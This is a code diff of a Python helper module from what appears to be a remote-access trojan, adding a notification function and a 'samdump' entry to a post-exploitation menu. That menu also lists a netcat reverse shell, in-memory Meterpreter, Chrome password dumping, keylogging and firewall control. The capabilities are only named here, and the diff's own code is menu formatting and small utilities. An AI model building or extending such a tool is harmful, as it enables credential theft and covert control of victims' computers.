@@ -2,7 +2,7 @@ import os
 from colorama import Style, Fore
 import colorama
 from PIL import Image
-
+from plyer import notification
 
 banner = r"""
 {makered}                                          
@@ -112,6 +112,7 @@ POST Exploitation
 -. {cmd} firewall_on - Enable firewall.
 -. {cmd} portfwd - Forward a PORT on the Remote PC.
 -. {cmd} portfwd_reset - Reset all forwarded Ports.
+-. {cmd} samdump - Dump SAM database.
 -. {dps} rshell - Netcat Reverse Shell.
 -. {dps} bshell - (UAC)* Netcat Bind Shell.
 -. {dps} dropmsf - In Memory Meterpreter.
@@ -119,7 +120,7 @@ POST Exploitation
 -. {dps} chromedump - Dump Google Chrome Passwords.
 -. {dps} keylog_start - Start Capturing keystrokes.
 -. {dps} keylog_stop - Stop Capturing keystrokes, And dump keylogs.
-"""
+""".format(dps = Style.BRIGHT  + Fore.GREEN+ "(DPS)" + Style.RESET_ALL , cmd = Style.BRIGHT + Fore.BLUE +"(CMD)" + Style.RESET_ALL)
 
 def clear_screen():
     if(os.name == "nt"):
@@ -141,6 +142,7 @@ def uniquify(path):
 
     return path
 
+# hmm? whats up you wanna fight bro?
 def xor(data, key):
     output = []
     for i in range(len(data)):
@@ -152,8 +154,8 @@ def xor(data, key):
 def saveAndShowImage(image):
     try:
         im = Image.open(image)  
-        im.show() 
         im.save(image, "PNG")
+        im.show() 
     except Exception as e:
         print("Error converting bmp to png : " + str(e))
 
@@ -165,3 +167,9 @@ def PrintTextFile(filename):
             print(data)
     except Exception as e:
         print("[X] Error : " + str(e))
+
+def notify(title, message):
+    notification.notify(
+        title, 
+        message
+    )
